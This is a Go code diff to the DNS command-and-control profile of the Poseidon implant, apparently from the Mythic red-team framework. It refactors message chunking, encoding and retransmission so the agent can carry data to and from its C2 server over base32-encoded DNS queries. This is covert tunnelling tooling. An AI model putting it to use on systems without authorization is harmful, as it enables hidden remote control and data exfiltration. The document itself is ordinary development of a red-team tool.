@@ -12,7 +12,6 @@ import (
 	"net"
 	"os"
 	"slices"
-	"sort"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles/dnsgrpc"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
@@ -41,25 +40,25 @@ type DNSInitialConfig struct {
 	DNSServer              string   `json:"dns_server"`
 	FailoverThreshold      int      `json:"failover_threshold"`
 	RecordType             string   `json:"record_type"`
-	MaxQueryLength         int      `json:"max_query_length"`
+	MaxQueryLength         uint32   `json:"max_query_length"`
 	Killdate               string   `json:"killdate"`
 	Interval               uint     `json:"callback_interval"`
 	Jitter                 uint     `json:"callback_jitter"`
 	EncryptedExchangeCheck bool     `json:"encrypted_exchange_check"`
 	AESPSK                 string   `json:"AESPSK"`
-	MaxSubdomainLength     int      `json:"max_subdomain_length"`
+	MaxSubdomainLength     uint32   `json:"max_subdomain_length"`
 }
 
 type C2DNS struct {
 	Domains               []string `json:"Domains"`
 	DNSServer             string   `json:"DNSServer"`
 	FailoverThreshold     int      `json:"failover_threshold"`
-	DomainLengths         map[string]int
+	DomainLengths         map[string]uint32
 	DomainErrors          map[string]int
 	DomainRotation        string `json:"DomainRotation"`
 	CurrentDomain         int
 	RecordType            string `json:"RecordType"`
-	MaxQueryLength        int    `json:"max_query_length"`
+	MaxQueryLength        uint32 `json:"max_query_length"`
 	Interval              int    `json:"Interval"`
 	Jitter                int    `json:"Jitter"`
 	ExchangingKeys        bool
@@ -71,17 +70,16 @@ type C2DNS struct {
 	stoppedChannel        chan bool
 	interruptSleepChannel chan bool
 	udpChunkSize          uint16
-	maxSubdomainLength    int
+	maxSubdomainLength    uint32
 	tcpConn               *dns.Conn
 	tcpConnDomain         string
 }
 
 // DnsMessageStream tracks the progress of a message in chunk transfer
 type DnsMessageStream struct {
-	Size          uint32
-	TotalReceived uint32
-	Messages      map[uint32]*dnsgrpc.DnsPacket
-	StartBytes    []uint32
+	TotalChunks    uint32
+	ChunksReceived map[uint32]bool
+	Messages       map[uint32]*dnsgrpc.DnsPacket
 }
 
 var dnsUDPClient = new(dns.Client)
@@ -107,7 +105,7 @@ func init() {
 	}
 	profile := C2DNS{
 		Domains:               initialConfig.Domains,
-		DomainLengths:         make(map[string]int),
+		DomainLengths:         make(map[string]uint32),
 		DomainErrors:          make(map[string]int),
 		DNSServer:             initialConfig.DNSServer,
 		DomainRotation:        initialConfig.DomainRotation,
@@ -261,7 +259,7 @@ func (c *C2DNS) UpdateConfig(parameter string, value string) {
 			tempDomains[i] = strings.TrimSpace(tempDomains[i])
 		}
 		c.Domains = tempDomains
-		c.DomainLengths = make(map[string]int)
+		c.DomainLengths = make(map[string]uint32)
 		c.DomainErrors = make(map[string]int)
 		for _, domain := range c.Domains {
 			c.DomainErrors[domain] = 0
@@ -526,7 +524,7 @@ func (c *C2DNS) getRequestType() uint16 {
 		return dns.TypeAAAA
 	}
 }
-func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
+func (c *C2DNS) getMaxLengthPerMessage(domain string) uint32 {
 	if _, ok := c.DomainLengths[domain]; ok {
 		return c.DomainLengths[domain]
 	}
@@ -537,8 +535,8 @@ func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
 		Action:         0,
 		AgentSessionID: math.MaxUint32,
 		MessageID:      math.MaxUint32,
-		Size:           math.MaxUint32,
-		Begin:          math.MaxUint32,
+		TotalChunks:    math.MaxUint32,
+		CurrentChunk:   math.MaxUint32,
 		Data:           nil,
 	}
 	jsonD, _ := proto.Marshal(d)
@@ -547,8 +545,8 @@ func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
 	//utils.PrintDebug(fmt.Sprintf("fixedLength of Packet: %d, total fixed lengths: %d", len(jsonD), fixedLengths))
 	// how much data can we add to those 45 bytes after 60% expansion due to base32
 	// still need to be <= 255 and need to account for one extra "." every 63 bytes
-	for i := 1; i < c.MaxQueryLength; i++ {
-		expandedData := int(float32(fixedLengths+i) * 1.6)
+	for i := 1; uint32(i) < c.MaxQueryLength; i++ {
+		expandedData := uint32(float32(fixedLengths+i) * 1.6)
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) base32 is (%d)", i, expandedData))
 		//base32Example := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(make([]byte, fixedLengths+i))
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) actual base32 is (%d)", i, len(base32Example)))
@@ -556,7 +554,7 @@ func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
 		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) needs %d . values. Total: %d", i, expandedData/63, expandedData))
 
 		if expandedData > c.MaxQueryLength {
-			c.DomainLengths[domain] = i - 1
+			c.DomainLengths[domain] = uint32(i - 1)
 			utils.PrintDebug(fmt.Sprintf("max message length determined for %s to be %d\n", domain, i-1))
 			//os.Exit(1)
 			return c.DomainLengths[domain]
@@ -586,13 +584,9 @@ func (c *C2DNS) increaseErrorCount(domain string) {
 }
 func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 	sendingStream := &DnsMessageStream{
-		Size:       uint32(len(msg)),
-		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
-		StartBytes: make([]uint32, 0),
-	}
-	ackStream := &DnsMessageStream{
-		Size:       uint32(len(msg)),
-		StartBytes: make([]uint32, 0),
+		TotalChunks:    0,
+		Messages:       make(map[uint32]*dnsgrpc.DnsPacket),
+		ChunksReceived: make(map[uint32]bool),
 	}
 	messageID := rand.Uint32()
 	//utils.PrintDebug(fmt.Sprintf("original message: %s\n", msg))
@@ -600,44 +594,43 @@ func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 		domain := c.getDomain()
 		utils.PrintDebug(fmt.Sprintf("trying domain: %s\n", domain))
 		dataLengthPerMessage := c.getMaxLengthPerMessage(domain)
-		chunks := len(msg) / dataLengthPerMessage
-		if chunks*dataLengthPerMessage < len(msg) {
+		chunks := uint32(len(msg)) / dataLengthPerMessage
+		if chunks*dataLengthPerMessage < uint32(len(msg)) {
 			chunks += 1 // might need to add 1 if there's a portion left over
 		}
-		sendingStream.TotalReceived = uint32(chunks)
+		sendingStream.TotalChunks = chunks
 
 		//utils.PrintDebug(fmt.Sprintf("sending message: Size (%d), Chunks (%d), dataLengthPerMessage: (%d), domain: (%s)\n",
 		//	sendingStream.Size, chunks, dataLengthPerMessage, domain))
-		for i := 0; i < len(msg); i += dataLengthPerMessage {
-			sendingStream.Messages[uint32(i)] = &dnsgrpc.DnsPacket{
+		for i := uint32(0); i < sendingStream.TotalChunks; i++ {
+			sendingStream.Messages[i] = &dnsgrpc.DnsPacket{
 				Action:         dnsgrpc.Actions_AgentToServer,
 				AgentSessionID: c.AgentSessionID,
 				MessageID:      messageID,
-				Size:           uint32(len(msg)),
-				Begin:          uint32(i),
+				TotalChunks:    sendingStream.TotalChunks,
+				CurrentChunk:   i,
 			}
-			if i+dataLengthPerMessage > len(msg) {
-				sendingStream.Messages[uint32(i)].Data = msg[i:]
+			if i*dataLengthPerMessage+dataLengthPerMessage > uint32(len(msg)) {
+				sendingStream.Messages[i].Data = msg[i*dataLengthPerMessage:]
 			} else {
-				sendingStream.Messages[uint32(i)].Data = msg[i : i+dataLengthPerMessage]
+				sendingStream.Messages[i].Data = msg[i*dataLengthPerMessage : i*dataLengthPerMessage+dataLengthPerMessage]
 			}
-			sendingStream.StartBytes = append(sendingStream.StartBytes, uint32(i))
-			//utils.PrintDebug(fmt.Sprintf("Begin (%d) Data: %s\n", i, sendingStream.Messages[uint32(i)].Data))
+			//utils.PrintDebug(fmt.Sprintf("Begin (%d) Data: %v\n", i, sendingStream.Messages[i].Data))
 		}
 		chunkErrors := 0
-		for i := 0; i < chunks && chunkErrors < 10; i++ {
+		for i := uint32(0); i < chunks && chunkErrors < 10; i++ {
 			m := new(dns.Msg)
 			//m.RecursionAvailable = true
 			m.RecursionDesired = true
-			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
+			jsonData, err := proto.Marshal(sendingStream.Messages[i])
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("marshal error: %v\n", err))
 				return 0
 			}
 			base32Data := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData))
 			finalData := ""
-			for j := 0; j < len(base32Data); j += c.maxSubdomainLength {
-				if j+c.maxSubdomainLength >= len(base32Data) {
+			for j := uint32(0); j < uint32(len(base32Data)); j += c.maxSubdomainLength {
+				if j+c.maxSubdomainLength >= uint32(len(base32Data)) {
 					finalData += base32Data[j:] + "."
 				} else {
 					finalData += base32Data[j:j+c.maxSubdomainLength] + "."
@@ -711,12 +704,15 @@ func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 			}
 			if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
 				// something happened and the server is asking to retransmit the message
-				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
-				ackStream.StartBytes = make([]uint32, 0)
-				i--
+				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[i].MessageID))
+				sendingStream.ChunksReceived = make(map[uint32]bool)
+				i = 0
+				chunkErrors = 0
 			} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
 				i = chunks // just to make sure we get out of this loop
 				//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
+			} else {
+				sendingStream.ChunksReceived[i] = true
 			}
 		}
 		if chunkErrors < 10 {
@@ -795,8 +791,9 @@ func getActionAndBytesOrdered(responses *[]dns.RR) (action uint8, bytes []byte, 
 }
 func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 	receivingStream := &DnsMessageStream{
-		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
-		StartBytes: make([]uint32, 0),
+		Messages:       make(map[uint32]*dnsgrpc.DnsPacket),
+		ChunksReceived: make(map[uint32]bool),
+		TotalChunks:    0,
 	}
 
 	lastChunk := uint32(0)
@@ -806,7 +803,7 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			Action:         dnsgrpc.Actions_ServerToAgent,
 			AgentSessionID: c.AgentSessionID,
 			MessageID:      messageID,
-			Begin:          lastChunk,
+			CurrentChunk:   lastChunk,
 		}
 		var response *dns.Msg
 		for {
@@ -821,8 +818,8 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			}
 			base32Data := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData))
 			finalData := ""
-			for j := 0; j < len(base32Data); j += c.maxSubdomainLength {
-				if j+c.maxSubdomainLength >= len(base32Data) {
+			for j := uint32(0); j < uint32(len(base32Data)); j += c.maxSubdomainLength {
+				if j+c.maxSubdomainLength >= uint32(len(base32Data)) {
 					finalData += base32Data[j:] + "."
 				} else {
 					finalData += base32Data[j:j+c.maxSubdomainLength] + "."
@@ -927,10 +924,12 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			}
 			if action == uint8(dnsgrpc.Actions_ReTransmit) {
 				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-				receivingStream.StartBytes = make([]uint32, 0)
+				receivingStream.TotalChunks = 0
+				receivingStream.ChunksReceived = make(map[uint32]bool)
+				receivingStream.Messages = make(map[uint32]*dnsgrpc.DnsPacket)
 				continue
 			} else if action == uint8(dnsgrpc.Actions_MessageLost) {
-				utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
+				utils.PrintDebug(fmt.Sprintf("Message lost on server, can't retrieve it: %v\n", messageID))
 				return nil
 			} else if dns.Fqdn(finalData+domain) != response.Answer[0].Header().Name {
 				utils.PrintDebug(fmt.Sprintf("got a message that doesn't match what we sent: %v\n", response))
@@ -949,19 +948,23 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 				c.increaseErrorCount(domain)
 				continue
 			}
-
-			receivingStream.StartBytes = append(receivingStream.StartBytes, receivedPacket.Begin)
-			receivingStream.Size += uint32(len(receivedPacket.Data))
-			receivingStream.Messages[receivedPacket.Begin] = receivedPacket
-			lastChunk += uint32(len(receivedPacket.Data))
-			if receivingStream.Size == receivedPacket.Size {
-				utils.PrintDebug(fmt.Sprintf("received message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
-				totalBuffer := make([]byte, receivedPacket.Size)
+			if _, ok := receivingStream.ChunksReceived[receivedPacket.CurrentChunk]; ok {
+				// got a chunk we already had, just continue
+				continue
+			}
+			receivingStream.ChunksReceived[receivedPacket.CurrentChunk] = true
+			receivingStream.Messages[receivedPacket.CurrentChunk] = receivedPacket
+			receivingStream.TotalChunks = receivedPacket.TotalChunks
+			lastChunk += 1
+			if lastChunk == receivingStream.TotalChunks {
+				utils.PrintDebug(fmt.Sprintf("received message: Size Chunks (%d)", receivingStream.TotalChunks))
+				totalBuffer := make([]byte, 0)
 				// sort all the start bytes to be in order
-				sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
+				//sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
 				// iterate over the start bytes and add the corresponding string data together
-				for i := 0; i < len(receivingStream.StartBytes); i++ {
-					copy(totalBuffer[receivingStream.Messages[receivingStream.StartBytes[i]].Begin:], receivingStream.Messages[receivingStream.StartBytes[i]].Data)
+				for i := uint32(0); i < receivingStream.TotalChunks; i++ {
+					totalBuffer = append(totalBuffer, receivingStream.Messages[i].Data[:]...)
+					//copy(totalBuffer[receivingStream.Messages[receivingStream.StartBytes[i]].Begin:], receivingStream.Messages[receivingStream.StartBytes[i]].Data)
 				}
 				return totalBuffer
 			}
